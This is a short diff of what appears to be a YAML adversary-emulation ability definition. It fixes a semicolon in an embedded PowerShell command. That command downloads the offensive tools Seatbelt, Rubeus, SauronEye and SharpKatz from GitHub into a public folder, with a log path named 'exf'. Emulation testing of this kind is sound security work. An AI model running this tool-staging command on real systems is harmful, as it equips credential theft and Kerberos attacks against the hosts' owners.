@@ -11,7 +11,7 @@
     parsers: []
     command: "$DownloadLogFile = \"$env:PUBLIC\\exf\\Tools_Download.log\";\n$DestinationPath\
       \ = \"$env:PUBLIC\\Toolz\\\";\n$SoftToDownload = @(\"Seatbelt.exe\",\"Rubeus.exe\"\
-      ,\"SauronEye.exe\",\"SharpKatz.exe\")\nforeach\
+      ,\"SauronEye.exe\",\"SharpKatz.exe\");\nforeach\
       \ ($Tool in $SoftToDownload) \n{\nWrite-host $Tool;\n  $DownloadRun = \"https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/$Tool\"\
       ;\n  $DestinationFilename = \"$DestinationPath$Tool\";\n  $web = (New-Object\
       \ System.Net.WebClient);\n  $result = $web.DownloadFile(\"$DownloadRun\", \"\
